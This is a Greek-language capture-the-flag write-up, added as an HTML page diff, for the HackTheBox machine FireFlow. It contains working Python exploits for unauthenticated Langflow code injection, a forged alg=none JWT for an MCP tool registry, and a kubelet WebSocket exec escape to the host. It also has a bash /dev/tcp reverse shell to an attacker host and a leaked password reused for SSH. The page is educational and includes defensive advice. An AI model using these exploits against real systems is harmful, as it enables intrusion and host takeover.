@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: FireFlow — S. Markakis</title>
+<meta name="description" content="Unauthenticated Langflow RCE μέσω component code injection, JWT none-algorithm auth bypass στην υπηρεσία MCP, και Kubernetes node-exporter pod-to-host escape μέσω kubelet WebSocket exec API.">
+<meta property="og:title" content="HTB: FireFlow — S. Markakis">
+<meta property="og:description" content="Unauthenticated Langflow RCE μέσω component code injection, JWT none-algorithm auth bypass στην υπηρεσία MCP, και Kubernetes node-exporter pod-to-host escape μέσω kubelet WebSocket exec API.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-fireflow-el.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-fireflow.png">
+<meta property="og:locale" content="el_GR">
+<meta property="og:locale:alternate" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-fireflow.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-fireflow-el.html">
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/htb-fireflow.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/htb-fireflow-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/htb-fireflow.html">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p {
+    color: var(--text);
+    margin-bottom: 1rem;
+  }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: FireFlow",
+  "description": "Langflow 1.8.2 unauthenticated RCE, JWT cryptographic bypass στην υπηρεσία MCP, και ένα multi-stage Kubernetes escape μέσω kubelet WebSocket exec και privileged container mounts.",
+  "datePublished": "2026-09-04",
+  "dateModified": "2026-09-04",
+  "inLanguage": "el",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-fireflow-el.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-fireflow.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-fireflow"
+  },
+  "timeRequired": "PT7M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Πίσω στο blog</a>
+
+<div class="wrapper">
+
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Πίσω στα posts</a>
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--text-mid);margin-bottom:1.2rem;"><a href="htb-fireflow.html" style="font-weight:600;">English</a> &nbsp;·&nbsp; <strong style="color:var(--text-dark);">Ελληνικά</strong></p>
+
+  <div class="post-header">
+    <h1>HTB: FireFlow</h1>
+    <div class="post-meta">
+      <span class="date">4 Σεπτεμβρίου 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag">Linux</span>
+      <span class="tag">Μέτριο</span>
+      <span>&nbsp;11 λεπτά αναγνωσης</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">Το προφίλ μου στο HTB &amp; περισσότερα boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Εργαλεία security &amp; automation ανοιχτού κώδικα</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Το FireFlow αλυσιδώνει τρεις ξεχωριστές επιφάνειες επίθεσης σε ένα πλήρες compromise: το <strong>Langflow 1.8.2</strong> εκθέτει ένα unauthenticated endpoint <code>POST /api/v1/build_public_tmp</code> που κάνει compile node graphs που δίνει ο χρήστης, εκτελώντας injected κώδικα Python στο πεδίο <code>.template.code</code> του component. Από εκεί, κάνουμε escalate σε ένα cluster Kubernetes μέσω της <strong>υπηρεσίας MCP AI Tool Registry</strong> (θύρα 30080), της οποίας η αυθεντικοποίηση JWT δέχεται ένα token <code>"alg": "none"</code> — παρακάμπτοντας εντελώς το auth. Τελικά, κάνουμε escape το pod μέσω του <strong>kubelet WebSocket exec API</strong>, αξιοποιώντας το δικαίωμα RBAC <code>nodes/proxy</code> του service account για να τρέξουμε εντολές σε ένα privileged pod node-exporter με <code>hostPath</code> mounts του filesystem του host.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">Langflow RCE :443</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">www-data shell</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">SSH creds</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">nightfall SSH</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">MCP JWT bypass</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">kubelet escape</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root</span>
+  </div>
+
+  <h2>Αναγνώριση</h2>
+
+  <h3>Nmap</h3>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">nmap -p- --min-rate 2000 -sC -sV &lt;TARGET_IP&gt;</span>
+
+<span class="po">PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 5ubuntu2.2
+443/tcp open  ssl/http nginx 1.26.0
+|_ssl-date: 2026-09-04
+| tls-alpn:
+|_  h2
+| ssl-cert: Subject: CN=*.fireflow.htb
+|_Subject Alternative Name: DNS:*.fireflow.htb, DNS:fireflow.htb</span></div>
+  </div>
+
+  <p>Δύο θύρες: SSH και HTTPS με ένα wildcard cert για το <code>*.fireflow.htb</code>. Το hostname μας δίνει το vhost· πρόσθεσέ το στο <code>/etc/hosts</code> και κάνε browse.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">/etc/hosts</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">echo "&lt;TARGET_IP&gt;  fireflow.htb flow.fireflow.htb" | sudo tee -a /etc/hosts</span></div>
+  </div>
+
+  <h3>Ανακάλυψη Langflow</h3>
+
+  <p>Το <code>fireflow.htb</code> είναι μια landing page για το "Task Force Nightfall". Το <code>flow.fireflow.htb</code> αποκαλύπτει τον πραγματικό στόχο: <strong>Langflow 1.8.2</strong>, ένα framework LLM orchestration. Το public API εκθέτει ορισμούς flow:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">Langflow public flow endpoint</span>
+    </div>
+    <div class="term-body"><span class="pc">curl -s https://flow.fireflow.htb/api/v1/flows/public_flow/7d84d636-af65-42e4-ac38-26e867052c25 | jq . | head -30</span>
+
+<span class="po">{
+  "id": "7d84d636-af65-42e4-ac38-26e867052c25",
+  "name": "Agent Dev",
+  "data": {
+    "nodes": [...],
+    "edges": [...]
+  }
+}</span></div>
+  </div>
+
+  <h2>Foothold — Langflow RCE μέσω Component Code Injection</h2>
+
+  <p>Το build endpoint του Langflow στο <code>POST /api/v1/build_public_tmp/{flow_id}/flow</code> δέχεται ένα JSON graph από nodes και edges. Κατά τη μεταγλώττιση, το πεδίο <code>.template.code</code> κάθε node — που περιέχει πηγαίο κώδικα Python — εκτελείται τη στιγμή που χτίζεται το graph. Το endpoint είναι unauthenticated, και ο κώδικας που ελέγχει ο χρήστης τρέχει σαν ο web server (<code>www-data</code>).</p>
+
+  <h3>Φτιάχνοντας το Payload</h3>
+
+  <p>Κάνουμε inject ένα custom node component με αυθαίρετη Python στο πεδίο <code>code</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">langflow_rce.py — Python code injection</span>
+    </div>
+    <div class="term-body"><span class="po">import json, subprocess, http.client, ssl, uuid
+
+TARGET = "flow.fireflow.htb"
+FLOW_ID = "7d84d636-af65-42e4-ac38-26e867052c25"
+
+PAYLOAD = """import subprocess
+result = subprocess.run(['bash', '-c', 'cat /etc/hostname &gt; /tmp/proof.txt'], capture_output=True)
+"""
+
+node = {
+    "id": "Custom-1",
+    "type": "genericNode",
+    "position": {"x": 0, "y": 0},
+    "data": {
+        "id": "Custom-1",
+        "type": "CustomComponent",
+        "node": {
+            "base_classes": ["Message"],
+            "display_name": "Custom",
+            "field_order": [],
+            "template": {
+                "_type": "Component",
+                "code": {
+                    "type": "code",
+                    "value": PAYLOAD
+                }
+            }
+        }
+    }
+}
+
+body = json.dumps({
+    "data": {"nodes": [node], "edges": [], "viewport": {"x": 0, "y": 0, "zoom": 1}}
+})
+
+ctx = ssl._create_unverified_context()
+conn = http.client.HTTPSConnection(TARGET, context=ctx)
+headers = {
+    "Host": TARGET,
+    "Content-Type": "application/json",
+    "Cookie": f"client_id={uuid.uuid4()}"
+}
+
+conn.request("POST", f"/api/v1/build_public_tmp/{FLOW_ID}/flow", body.encode(), headers)
+resp = conn.getresponse()
+print(f"Status: {resp.status}")
+print(f"Response: {resp.read().decode()[:500]}")</span></div>
+  </div>
+
+  <div class="alert alert-warn">Το να εκτελείς κώδικα Python που δίνει ο χρήστης από ένα web request είναι επικίνδυνο εκ σχεδιασμού. Το Langflow το σχεδίασε αυτό μόνο για development flows, αλλά το endpoint κυκλοφορεί unauthenticated σε αυτό το box. Σε production, είτε απαίτησε authentication, είτε απομόνωσε τη μεταγλώττιση flow σε ένα sandbox, είτε απενεργοποίησε εντελώς τη δυναμική εκτέλεση κώδικα.</div>
+
+  <h3>Αποκτώντας Reverse Shell</h3>
+
+  <p>Μόλις επιβεβαιώσουμε εκτέλεση κώδικα, κάνουμε escalate σε interactive shell:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">reverse shell via Langflow RCE</span>
+    </div>
+    <div class="term-body"><span class="po">PAYLOAD = """import subprocess
+subprocess.run(['bash', '-i', '>&', '/dev/tcp/&lt;LHOST&gt;/4444', '0>&amp;1'], shell=True)
+"""</span>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">nc -lvnp 4444</span>
+
+<span class="po">connect to [&lt;LHOST&gt;] from 10.129.120.233
+</span><span class="pu">www-data</span><span class="ps">@</span><span class="ph">fireflow</span><span class="ps">:</span><span class="pp">/app</span><span class="ps">$ </span><span class="pc">id</span>
+<span class="po">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></div>
+  </div>
+
+  <h2>www-data → nightfall — Credentials SSH στο Environment</h2>
+
+  <p>Μέσα στο container, μεταβλητές environment διαρρέουν credentials:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">environment enumeration</span>
+    </div>
+    <div class="term-body"><span class="pu">www-data</span><span class="ps">@</span><span class="ph">fireflow</span><span class="ps">:</span><span class="pp">/app</span><span class="ps">$ </span><span class="pc">env | grep -i pass</span>
+
+<span class="po">LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll</span></div>
+  </div>
+
+  <p>Εκείνο το password δουλεύει για SSH ως <code>nightfall</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ssh nightfall@fireflow.htb</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">ssh nightfall@10.129.120.233</span>
+<span class="po">Password: </span><span class="pc">n1ghtm4r3_b4_n1ghtf4ll</span>
+
+<span class="pu">nightfall</span><span class="ps">@</span><span class="ph">fireflow</span><span class="ps">:</span><span class="pp">~</span><span class="ps">$ </span><span class="pc">id &amp;&amp; cat user.txt</span>
+<span class="po">uid=1000(nightfall) gid=1000(nightfall) groups=1000(nightfall)
+</span><span class="pg">[redacted — user flag: 4fc4c15bad3bd4a174c91a6ea88bc82c]</span></div>
+  </div>
+
+  <h2>nightfall → root (μέσω MCP + Kubernetes)</h2>
+
+  <h3>Καταμέτρηση Θυρών: Υπηρεσία MCP στο :30080</h3>
+
+  <p>Μέσα στο box, μια μη-στάνταρ υπηρεσία ακούει στο 127.0.0.1:30080:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">netstat -tlnp (local only)</span>
+    </div>
+    <div class="term-body"><span class="pu">nightfall</span><span class="ps">@</span><span class="ph">fireflow</span><span class="ps">:</span><span class="pp">~</span><span class="ps">$ </span><span class="pc">ss -tlnp | grep 30080</span>
+
+<span class="po">LISTEN 127.0.0.1:30080  root /usr/bin/python3 (MCP service)</span></div>
+  </div>
+
+  <h3>Παράκαμψη Authentication JWT του MCP</h3>
+
+  <p>Το probing της υπηρεσίας αποκαλύπτει ότι είναι ένα AI Tool Registry MCP (Model Context Protocol) που χρησιμοποιεί JSON-RPC 2.0 και auth βασισμένο σε JWT. Ωστόσο, η υπηρεσία <strong>δέχεται JWT tokens με <code>"alg": "none"</code></strong> — ένα κρίσιμο ελάττωμα. Όταν ένα JWT έχει <code>alg: none</code>, η επαλήθευση υπογραφής παραλείπεται· μπορούμε να πλαστογραφήσουμε admin tokens χωρίς να ξέρουμε το secret:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">jwt_none_exploit.py</span>
+    </div>
+    <div class="term-body"><span class="po">import json, base64, subprocess
+
+def create_jwt_none():
+    header = {"typ": "JWT", "alg": "none"}
+    payload = {"sub": "admin", "admin": True, "role": "admin"}
+
+    def b64(data):
+        return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')
+
+    return f"{b64(header)}.{b64(payload)}."  </span><span class="pco"># No signature for 'none'</span><span class="po">
+
+jwt = create_jwt_none()
+print(f"[+] JWT (alg=none): {jwt[:60]}...")
+
+</span><span class="pco"># Register a malicious MCP tool in the registry</span><span class="po">
+tool_def = {
+    "jsonrpc": "2.0",
+    "method": "register_tool",
+    "params": {
+        "name": "shell",
+        "description": "Execute shell commands",
+        "code": "import subprocess; subprocess.run(['id'], shell=True)"
+    },
+    "id": 1
+}
+
+cmd = f'''curl -s -X POST http://127.0.0.1:30080/mcp \
+  -H "Authorization: Bearer {jwt}" \
+  -H "Content-Type: application/json" \
+  -d '{json.dumps(tool_def)}'
+'''
+
+result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+print(f"[*] Tool registration response: {result.stdout[:500]}")</span></div>
+  </div>
+
+  <h3>Kubernetes Escape: Kubelet WebSocket Exec</h3>
+
+  <p>Με πρόσβαση MCP, ανακαλύπτουμε ότι το pod έχει credentials service account Kubernetes και δικαίωμα RBAC <code>nodes/proxy</code>. Το token του service account είναι mounted στο <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>. Το χρησιμοποιούμε για να συνδεθούμε στο API kubelet πάνω στον node και να εκτελέσουμε εντολές σε ένα privileged pod node-exporter που έχει <code>hostPath</code> mounts ολόκληρου του filesystem του host:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">kubelet_escape.py</span>
+    </div>
+    <div class="term-body"><span class="po">import asyncio, ssl, websockets
+
+async def run():
+    TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
+    NODE_IP = "&lt;NODE_IP&gt;"  </span><span class="pco"># The node running the pod</span><span class="po">
+
+    </span><span class="pco"># Kubelet exec API: wss://NODE:10250/exec/NAMESPACE/POD/CONTAINER?command=...&amp;output=1</span><span class="po">
+    url = f"wss://{NODE_IP}:10250/exec/monitoring/prometheus-prometheus-node-exporter-XXXXX/node-exporter"
+    url += "?output=1&amp;error=1&amp;command=cat&amp;command=/host/root/root/root.txt"
+
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+
+    async with websockets.connect(
+        url,
+        ssl=ctx,
+        additional_headers={"Authorization": f"Bearer {TOKEN}"},
+        subprotocols=["v4.channel.k8s.io"]
+    ) as ws:
+        async for msg in ws:
+            </span><span class="pco"># First byte is the stream type; rest is output</span><span class="po">
+            print(msg[1:].decode(errors="replace"), end="", flush=True)
+
+asyncio.run(run())</span></div>
+  </div>
+
+  <p>Το pod node-exporter έχει <code>hostPath</code> mounts στο <code>/host/</code> που αντιστοιχούν στο root filesystem του host. Το path <code>/host/root/root/root.txt</code> είναι στην πραγματικότητα το <code>/root/root.txt</code> του host:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">kubelet exec → host root flag</span>
+    </div>
+    <div class="term-body"><span class="po">wss://&lt;NODE_IP&gt;:10250/exec/.../node-exporter?command=cat&amp;command=/host/root/root/root.txt</span>
+
+<span class="pg">5b5b0c61343afebf2857fad4ee98cb5f</span></div>
+  </div>
+
+  <div class="alert alert-success">Το Kubernetes pod-to-host escape αλυσιδώνει το token του service account (με RBAC <code>nodes/proxy</code>) + API kubelet WebSocket + privileged pod mounts. Οι τρεις κρίκοι φαίνονται καθένας αθώος μεμονωμένα: τα service accounts είναι φυσιολογικά, το kubelet exec είναι σκόπιμο, και τα mounts container είναι για debugging. Μαζί, σχηματίζουν μια πλήρη privilege escalation σε root στον υποκείμενο node.</div>
+
+  <h2>Γιατί Δούλεψε</h2>
+
+  <table class="st">
+    <tr><th>Σταδιο</th><th>Ριζα του προβληματος</th></tr>
+    <tr><td>www-data</td><td>Unauthenticated build endpoint του Langflow εκτελεί κώδικα Python που δίνει ο χρήστης (CWE-94)</td></tr>
